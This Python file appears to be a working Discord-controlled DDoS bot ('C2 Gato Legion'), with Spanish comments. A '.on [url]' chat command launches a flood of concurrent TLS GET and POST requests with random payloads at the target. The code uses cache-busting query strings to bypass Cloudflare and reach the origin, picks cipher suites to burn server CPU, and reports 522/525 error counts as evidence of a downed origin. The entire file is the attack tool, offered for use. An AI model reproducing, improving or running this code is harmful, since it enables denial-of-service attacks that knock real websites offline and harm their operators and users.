import subprocess
import sys
import os

# --- INSTALADOR AUTOMÁTICO DE REQUISITOS ---
def check_libs():
    required = ["aiohttp", "discord.py", "colorama"]
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            print(f"📦 Instalando dependencia faltante: {lib}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

check_libs()

import asyncio, aiohttp, ssl, random, time, discord
from discord.ext import commands
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURACIÓN DE PODER ---
TOKEN = "pon"
HILOS_POR_RAFAGA = 1000  # Máximo para tus 16GB RAM
MENSAJES = ["C2Pmiv", "Gatos_On_Fire", "SSL_Perforator", "Bypass_Enterprise"]

# Variables de Control Global
stats = {"hits": 0, "525": 0, "522": 0, "active": False, "target": ""}

class GatoC2(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents)

    async def on_ready(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.GREEN}✅ REQUISITOS VERIFICADOS")
        print(f"{Fore.CYAN}👑 C2 GATO LEGION V24.1 ONLINE")
        print(f"{Fore.YELLOW}Esperando comando .on [url] en Discord...")

    async def attack_engine(self):
        """Motor de saturación TLS/SSL agresiva"""
        while stats["active"]:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Ciphers que obligan al servidor a trabajar más (High CPU Load)
            ctx.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384')
            
            # Conector optimizado para ignorar caché y saturar sockets
            conn = aiohttp.TCPConnector(ssl=ctx, limit=0, ttl_dns_cache=300)
            async with aiohttp.ClientSession(connector=conn) as session:
                while stats["active"]:
                    tasks = [self.fire_payload(session) for _ in range(120)] # Ráfagas controladas
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(0.001) # Respiro para el tráfico del Bot

    async def fire_payload(self, session):
        msg = random.choice(MENSAJES)
        # Headers para forzar al ORIGEN (Bypass total de Snapshots)
        headers = {
            "User-Agent": f"GatoLegion/24.1 (Windows; {msg}; {random.getrandbits(16)})",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "X-Signature": msg,
            "Connection": "keep-alive"
        }
        # URL única para evitar que Cloudflare sirva una copia guardada
        url = f"{stats['target']}?nocache={random.getrandbits(64)}&v={time.time()}"
        
        try:
            # MIX LETAL: 60% POST de 2KB para quemar RAM / 40% GET para quemar CPU
            if random.random() > 0.4:
                async with session.post(url, headers=headers, data={"shred": os.urandom(2048).hex()}, timeout=5) as r:
                    pass
            else:
                async with session.get(url, headers=headers, timeout=5) as r:
                    pass
            
            stats["hits"] += 1
            if r.status == 525: stats["525"] += 1
            elif r.status in [522, 524]: stats["522"] += 1
        except:
            stats["522"] += 1

bot = GatoC2()

@bot.command()
async def on(ctx, url):
    if stats["active"]:
        return await ctx.send("⚠️ La legión ya está en combate.")
    
    stats["target"] = url if url.startswith("http") else f"https://{url}"
    stats["active"] = True
    stats["hits"], stats["525"], stats["522"] = 0, 0, 0
    
    embed = discord.Embed(title="🐱 INICIANDO PERFORACIÓN TLS", color=0xff0000)
    embed.add_field(name="🎯 OBJETIVO", value=f"`{stats['target']}`", inline=False)
    embed.add_field(name="🚀 POTENCIA", value=f"`{HILOS_POR_RAFAGA} hilos/VM`", inline=True)
    embed.set_footer(text="Multi-VM Sync Active | Bypass Cache ON")
    
    msg_update = await ctx.send(embed=embed)
    asyncio.create_task(bot.attack_engine())
    
    # Actualización de Logs Reales cada minuto
    while stats["active"]:
        await asyncio.sleep(60)
        if not stats["active"]: break
        
        new_embed = discord.Embed(title="📊 LOGS DE COMBATE (TIEMPO REAL)", color=0x00ff00)
        new_embed.add_field(name="🔥 Handshake Fail (525)", value=f"`{stats['525']}`", inline=True)
        new_embed.add_field(name="⏳ Origen Muerto (522)", value=f"`{stats['522']}`", inline=True)
        new_embed.add_field(name="🚀 Hits Perforados", value=f"`{stats['hits']}`", inline=False)
        new_embed.set_footer(text=f"Sincronizado: {time.strftime('%H:%M:%S')}")
        try: await msg_update.edit(embed=new_embed)
        except: break

@bot.command()
async def off(ctx):
    stats["active"] = False
    await ctx.send("🛑 **ORDEN RECIBIDA.** Deteniendo el ataque en todas las VMs...")

if __name__ == "__main__":
    bot.run(TOKEN)
      
